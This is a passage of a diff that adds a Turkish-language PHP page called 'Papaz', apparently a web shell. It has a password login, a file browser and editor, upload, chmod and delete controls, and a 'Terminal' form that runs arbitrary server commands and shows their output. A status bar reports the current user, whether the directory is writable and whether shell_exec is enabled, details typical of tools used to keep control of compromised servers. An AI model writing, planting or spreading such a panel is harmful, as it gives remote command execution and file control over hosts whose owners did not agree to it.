+            if ($a['type'] === $b['type']) {
+                return strcasecmp($a['name'], $b['name']);
+            }
+            return $a['type'] === 'folder' ? -1 : 1;
+        });
+    }
+    
+    // Breadcrumb
+    $relativePath = str_replace($baseDir, '', $currentPath);
+    $pathParts = array_filter(explode('/', $relativePath));
+    $breadcrumbs = array();
+    $tempPath = $baseDir;
+    $breadcrumbs[] = array('name' => 'Root', 'path' => $baseDir);
+
+    foreach ($pathParts as $part) {
+        $tempPath .= '/' . $part;
+        $breadcrumbs[] = array('name' => $part, 'path' => $tempPath);
+    }
+    
+    $systemInfo = getSystemInfo();
+    $currentURL = getCurrentURL($currentPath);
+}
+
+$csrfToken = generateCSRFToken();
+?>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Papaz</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        :root {
+            --primary: #3b82f6;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --bg: #f9fafb;
+            --surface: #ffffff;
+            --border: #e5e7eb;
+            --text: #1f2937;
+            --text-muted: #6b7280;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header */
+        .header {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header h1 {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text);
+        }
+        
+        /* Status Bar */
+        .status-bar {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 24px;
+            flex-wrap: wrap;
+            font-size: 13px;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-muted);
+        }
+        
+        .status-item strong {
+            color: var(--text);
+        }
+        
+        .status-item a:hover {
+            text-decoration: underline !important;
+        }
+        
+        .status-ok {
+            color: var(--success);
+            font-weight: 600;
+        }
+        
+        .status-error {
+            color: var(--danger);
+            font-weight: 600;
+        }
+        
+        /* Notifications */
+        .notification {
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+        
+        .notification.success {
+            background: #d1fae5;
+            color: #065f46;
+            border: 1px solid #6ee7b7;
+        }
+        
+        .notification.error {
+            background: #fee2e2;
+            color: #991b1b;
+            border: 1px solid #fca5a5;
+        }
+        
+        /* Layout */
+        .layout {
+            display: grid;
+            grid-template-columns: 1fr 280px;
+            gap: 20px;
+        }
+        
+        .panel {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+        }
+        
+        .panel-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--text);
+        }
+        
+        /* Breadcrumb */
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px;
+            background: var(--bg);
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            flex-wrap: wrap;
+        }
+        
+        .breadcrumb a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+        
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        
+        .breadcrumb span {
+            color: var(--text-muted);
+        }
+        
+        /* File List */
+        .file-list {
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .file-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--border);
+            transition: background 0.2s;
+            cursor: pointer;
+        }
+        
+        .file-item:last-child {
+            border-bottom: none;
+        }
+        
+        .file-item:hover {
+            background: var(--bg);
+        }
+        
+        .file-icon {
+            margin-right: 10px;
+            color: var(--text-muted);
+            flex-shrink: 0;
+        }
+        
+        .file-name {
+            flex: 1;
+            font-size: 14px;
+            min-width: 0;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        .file-name-link {
+            color: var(--text);
+            text-decoration: none;
+        }
+        
+        .file-name-link:hover {
+            color: var(--primary);
+        }
+        
+        .file-meta {
+            display: flex;
+            gap: 12px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-right: 12px;
+        }
+        
+        .file-actions {
+            display: flex;
+            gap: 10px;
+            font-size: 13px;
+        }
+        
+        .action-btn {
+            padding: 6px 12px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            cursor: pointer;
+            color: var(--text-muted);
+            border-radius: 6px;
+            transition: all 0.2s;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 12px;
+            min-width: auto;
+            white-space: nowrap;
+        }
+        
+        .action-btn:hover {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+            transform: translateY(-1px);
+        }
+        
+        .action-btn.danger {
+            background: #fee2e2;
+            border-color: #fca5a5;
+            color: var(--danger);
+        }
+        
+        .action-btn.danger:hover {
+            background: var(--danger);
+            color: white;
+            border-color: var(--danger);
+        }
+        
+        /* Forms */
+        .form-group {
+            margin-bottom: 12px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        
+        .form-input, .form-textarea {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-family: inherit;
+            font-size: 14px;
+        }
+        
+        .form-input:focus, .form-textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+        
+        .form-textarea {
+            font-family: 'Courier New', monospace;
+            min-height: 500px;
+            resize: vertical;
+        }
+        
+        /* Buttons */
+        .btn {
+            padding: 8px 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #2563eb;
+        }
+        
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+        
+        .btn-success:hover {
+            background: #059669;
+        }
+        
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #dc2626;
+        }
+        
+        .btn-outline {
+            background: white;
+            border: 1px solid var(--border);
+            color: var(--text);
+        }
+        
+        .btn-outline:hover {
+            background: var(--bg);
+        }
+        
+        .btn-block {
+            width: 100%;
+            justify-content: center;
+        }
+        
+        /* Terminal */
+        .terminal {
+            background: #1e1e1e;
+            color: #0f0;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 200px;
+            overflow-y: auto;
+            margin-top: 12px;
+        }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 8px;
+            padding: 24px;
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .modal-title {
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--text-muted);
+            padding: 0;
+            line-height: 1;
+        }
+        
+        /* Login */
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .login-box {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            padding: 32px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .login-box h1 {
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 20px;
+        }
+        
+        /* Sidebar Section */
+        .sidebar-section {
+            margin-bottom: 20px;
+        }
+        
+        .sidebar-section:last-child {
+            margin-bottom: 0;
+        }
+        
+        /* Info List */
+        .info-list {
+            font-size: 12px;
+        }
+        
+        .info-list-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .info-list-item:last-child {
+            border-bottom: none;
+        }
+        
+        .info-list-label {
+            color: var(--text-muted);
+        }
+        
+        .info-list-value {
+            color: var(--text);
+            font-weight: 500;
+            text-align: right;
+        }
+        
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--text-muted);
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .layout {
+                grid-template-columns: 1fr;
+            }
+            
+            .file-meta {
+                display: none;
+            }
+            
+            .file-actions {
+                flex-wrap: wrap;
+                gap: 6px;
+            }
+            
+            .action-btn {
+                font-size: 11px;
+                padding: 5px 10px;
+            }
+            
+            .status-bar {
+                font-size: 12px;
+                gap: 16px;
+            }
+        }
+        
+        @media (max-width: 1200px) {
+            .file-item {
+                flex-wrap: wrap;
+            }
+            
+            .file-actions {
+                flex-basis: 100%;
+                margin-top: 8px;
+                padding-left: 26px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<?php if (!$isAuthenticated): ?>
+    <!-- Login -->
+    <div class="login-container">
+        <div class="login-box">
+            <h1>Papaz</h1>
+            
+            <?php if (isset($loginError)): ?>
+                <div class="notification error"><?= htmlspecialchars($loginError) ?></div>
+            <?php endif; ?>
+            
+            <form method="POST">
+                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                <div class="form-group">
+                    <input type="password" name="password" class="form-input" placeholder="Şifre girin" required autofocus>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">Giriş Yap</button>
+        </form>
+        </div>
+    </div>
+<?php else: ?>
+    <!-- Main App -->
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>Papaz💤 </h1>
+            <a href="?logout=1" class="btn btn-danger">Çıkış</a>
+        </div>
+        
+        <?php if (!isset($_GET['edit'])): ?>
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div class="status-item">
+                <i data-lucide="hard-drive" style="width: 14px; height: 14px;"></i>
+                <span><strong><?= htmlspecialchars($systemInfo['os']) ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="code" style="width: 14px; height: 14px;"></i>
+                <span>PHP <strong><?= htmlspecialchars($systemInfo['php_version']) ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="user" style="width: 14px; height: 14px;"></i>
+                <span><strong><?= htmlspecialchars($systemInfo['current_user']) ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="edit" style="width: 14px; height: 14px;"></i>
+                <span>Yazılabilir: <strong class="<?= $systemInfo['writable'] ? 'status-ok' : 'status-error' ?>"><?= $systemInfo['writable'] ? 'EVET' : 'HAYIR' ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="terminal" style="width: 14px; height: 14px;"></i>
+                <span>Komut: <strong class="<?= $systemInfo['functions']['shell_exec'] ? 'status-ok' : 'status-error' ?>"><?= $systemInfo['functions']['shell_exec'] ? 'AKTİF' : 'PASİF' ?></strong></span>
+            </div>
+            <div class="status-item">
+                <i data-lucide="database" style="width: 14px; height: 14px;"></i>
+                <span><strong><?= formatSize($systemInfo['disk_free']) ?></strong> / <?= formatSize($systemInfo['disk_total']) ?></span>
+            </div>
+            <div class="status-item" style="flex-basis: 100%; margin-top: 4px;">
+                <i data-lucide="globe" style="width: 14px; height: 14px;"></i>
+                <span>URL: <a href="<?= htmlspecialchars($currentURL) ?>" target="_blank" style="color: var(--primary); text-decoration: none;"><strong><?= htmlspecialchars($currentURL) ?></strong></a></span>
+            </div>
+        </div>
+        <?php endif; ?>
+        
+        <!-- Notifications -->
+        <?php if (isset($success)): ?>
+            <div class="notification success"><?= htmlspecialchars($success) ?></div>
+        <?php endif; ?>
+        
+        <?php if (isset($error)): ?>
+            <div class="notification error"><?= htmlspecialchars($error) ?></div>
+        <?php endif; ?>
+        
+            <?php if (isset($_GET['edit'])): ?>
+            <!-- Edit Mode -->
+                <?php
+            $editPath = securePath($_GET['edit'], $baseDir);
+            if ($editPath !== false && is_file($editPath)):
+                $currentURL = getCurrentURL($editPath, true);
+                ?>
+                <!-- File URL Info -->
+            <div class="status-bar" style="margin-bottom: 20px;">
+                <div class="status-item" style="flex-basis: 100%;">
+                    <i data-lucide="globe" style="width: 14px; height: 14px;"></i>
+                    <span>Dosya URL: <a href="<?= htmlspecialchars($currentURL) ?>" target="_blank" style="color: var(--primary); text-decoration: none;"><strong><?= htmlspecialchars($currentURL) ?></strong></a></span>
+                </div>
+            </div>
+            
+                <div class="panel">
+                <div class="panel-title">Dosya Düzenle: <?= htmlspecialchars(basename($editPath)) ?></div>
+                
+                <a href="?path=<?= urlencode(dirname($editPath)) ?>" class="btn btn-outline" style="margin-bottom: 16px;">
+                    ← Geri
+                </a>
+                
+                <form method="POST">
+                    <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                    <input type="hidden" name="file_path" value="<?= htmlspecialchars($editPath) ?>">
+                    <input type="hidden" name="edit_file" value="1">
+                    
+                    <div class="form-group">
+                        <textarea name="file_content" class="form-textarea"><?= htmlspecialchars(file_get_contents($editPath)) ?></textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-success">Kaydet</button>
+                    </form>
+                </div>
+                <?php endif; ?>
+            <?php else: ?>
+            <!-- Browse Mode -->
+            <div class="layout">
+                <!-- Main Panel -->
+                <div class="panel">
+                    <div class="panel-title">Dosyalar</div>
+                    
+                    <!-- Breadcrumb -->
+                    <div class="breadcrumb">
+                        <?php foreach ($breadcrumbs as $index => $crumb): ?>
+                            <?php if ($index > 0): ?>
+                                <span>/</span>
+                        <?php endif; ?>
+                            
+                                <?php if ($index < count($breadcrumbs) - 1): ?>
+                                    <a href="?path=<?= urlencode($crumb['path']) ?>"><?= htmlspecialchars($crumb['name']) ?></a>
+                                <?php else: ?>
+                                    <span><?= htmlspecialchars($crumb['name']) ?></span>
+                                <?php endif; ?>
+                            <?php endforeach; ?>
+                        </div>
+                    
+                    <!-- File List -->
+                    <?php if (empty($items)): ?>
+                        <div class="empty-state">Bu klasör boş</div>
+                    <?php else: ?>
+                        <div class="file-list">
+                            <?php if ($currentPath !== $baseDir): ?>
+                                <a href="?path=<?= urlencode(dirname($currentPath)) ?>" style="text-decoration: none;">
+                                    <div class="file-item">
+                                        <i data-lucide="corner-up-left" class="file-icon" style="width: 16px; height: 16px;"></i>
+                                        <div class="file-name">..</div>
+                    </div>
+                                </a>
+                            <?php endif; ?>
+                            
+                            <?php foreach ($items as $item): ?>
+                                <div class="file-item">
+                                    <i data-lucide="<?= $item['icon'] ?>" class="file-icon" style="width: 16px; height: 16px;"></i>
+                                    
+                                    <?php if ($item['type'] === 'folder'): ?>
+                                        <a href="?path=<?= urlencode($item['path']) ?>" class="file-name file-name-link">
+                                            <?= htmlspecialchars($item['name']) ?>
+                                        </a>
+                                    <?php else: ?>
+                                        <a href="?edit=<?= urlencode($item['path']) ?>" class="file-name file-name-link">
+                                            <?= htmlspecialchars($item['name']) ?>
+                                        </a>
+                                    <?php endif; ?>
+                                    
+                                    <div class="file-meta">
+                                        <?php if ($item['type'] === 'file'): ?>
+                                            <span><?= formatSize($item['size']) ?></span>
+                                        <?php endif; ?>
+                                        <span><?= date('d.m.Y H:i', $item['modified']) ?></span>
+                                    </div>
+                                    
+                                    <div class="file-actions">
+                                        <?php if ($item['type'] === 'file'): ?>
+                                            <a href="?edit=<?= urlencode($item['path']) ?>" class="action-btn">Düzenle</a>
+                                            <a href="?download=<?= urlencode($item['path']) ?>" class="action-btn">İndir</a>
+                                        <?php endif; ?>
+                                        <button class="action-btn" onclick="openRenameModal('<?= htmlspecialchars($item['path']) ?>', '<?= htmlspecialchars($item['name']) ?>')">Yeniden Adlandır</button>
+                                        <button class="action-btn" onclick="openChmodModal('<?= htmlspecialchars($item['path']) ?>', '<?= $item['permissions'] ?>')">İzinler</button>
+                                        <button class="action-btn danger" onclick="deleteItem('<?= htmlspecialchars($item['path']) ?>', '<?= htmlspecialchars($item['name']) ?>')">Sil</button>
+                                    </div>
+                                </div>
+                            <?php endforeach; ?>
+                        </div>
+                    <?php endif; ?>
+                </div>
+                
+                <!-- Sidebar -->
+                <div>
+                    <!-- Upload -->
+                    <div class="panel sidebar-section">
+                        <div class="panel-title">Yükle</div>
+                        <form method="POST" enctype="multipart/form-data">
+                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                            <div class="form-group">
+                                <input type="file" name="upload_file" class="form-input" required>
+                            </div>
+                            <button type="submit" class="btn btn-primary btn-block">Yükle</button>
+                        </form>
+                    </div>
+                    
+                    <!-- Create -->
+                    <div class="panel sidebar-section">
+                        <div class="panel-title">Yeni Oluştur</div>
+                        <form method="POST">
+                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                            <div class="form-group">
+                                <input type="text" name="file_name" class="form-input" placeholder="Dosya adı" required>
+                            </div>
+                            <button type="submit" name="create_file" class="btn btn-success btn-block">Dosya</button>
+                                    </form>
+                        
+                        <form method="POST" style="margin-top: 8px;">
+                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                            <div class="form-group">
+                                <input type="text" name="folder_name" class="form-input" placeholder="Klasör adı" required>
+                            </div>
+                            <button type="submit" name="create_folder" class="btn btn-primary btn-block">Klasör</button>
+                                    </form>
+                    </div>
+                    
+                    <!-- Terminal -->
+                    <div class="panel sidebar-section">
+                        <div class="panel-title">Terminal</div>
+                        <form method="POST">
+                            <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                            <div class="form-group">
+                                <input type="text" name="command" class="form-input" placeholder="Komut" required>
+                            </div>
+                            <button type="submit" name="run_command" class="btn btn-primary btn-block">Çalıştır</button>
+                        </form>
+                        
+                        <?php if (isset($commandOutput)): ?>
+                            <div class="terminal"><?= htmlspecialchars($commandOutput) ?></div>
+                        <?php endif; ?>
+                    </div>
+                    </div>
+                </div>
+            <?php endif; ?>
+        </div>
+
+    <!-- Modals -->
+    <div id="renameModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">Yeniden Adlandır</h3>
+                <button class="modal-close" onclick="closeModal('renameModal')">&times;</button>
+            </div>
+            <form method="POST">
+                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                <input type="hidden" name="old_path" id="rename_old_path">
+                <input type="hidden" name="rename" value="1">
+                <div class="form-group">
+                    <input type="text" name="new_name" id="rename_new_name" class="form-input" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">Kaydet</button>
+                </form>
+        </div>
+    </div>
+    
+    <div id="chmodModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title">İzinleri Değiştir</h3>
+                <button class="modal-close" onclick="closeModal('chmodModal')">&times;</button>
+            </div>
+            <form method="POST">
+                <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+                <input type="hidden" name="chmod_path" id="chmod_path">
+                <input type="hidden" name="chmod" value="1">
+                <div class="form-group">
+                    <input type="text" name="permissions" id="chmod_permissions" class="form-input" pattern="[0-7]{4}" required>
+            </div>
+                <button type="submit" class="btn btn-primary btn-block">Kaydet</button>
+            </form>
+        </div>
+    </div>
+    
+    <form id="deleteForm" method="POST" style="display: none;">
+        <input type="hidden" name="csrf_token" value="<?= $csrfToken ?>">
+        <input type="hidden" name="delete_path" id="delete_path">
+        <input type="hidden" name="delete" value="1">
+    </form>
+
+<script>
+    lucide.createIcons();
+        
+        function openRenameModal(path, name) {
+            document.getElementById('rename_old_path').value = path;
+            document.getElementById('rename_new_name').value = name;
+            document.getElementById('renameModal').classList.add('active');
+        }
+        
+        function openChmodModal(path, permissions) {
+            document.getElementById('chmod_path').value = path;
+            document.getElementById('chmod_permissions').value = permissions;
+            document.getElementById('chmodModal').classList.add('active');
+        }
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
+        
+        function deleteItem(path, name) {
+            if (confirm('Silmek istediğinizden emin misiniz?\n\n' + name)) {
+                document.getElementById('delete_path').value = path;
+                document.getElementById('deleteForm').submit();
+            }
+        }
+        
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.classList.remove('active');
+            }
+        }
+        
+        setTimeout(function() {
+            const notifications = document.querySelectorAll('.notification');
+            notifications.forEach(function(notification) {
+                notification.style.opacity = '0';
+                notification.style.transition = 'opacity 0.5s';
+                setTimeout(function() {
+                    notification.remove();
+                }, 500);
+            });
+        }, 5000);
+</script>
+<?php endif; ?>
+
+</body>
 </html>
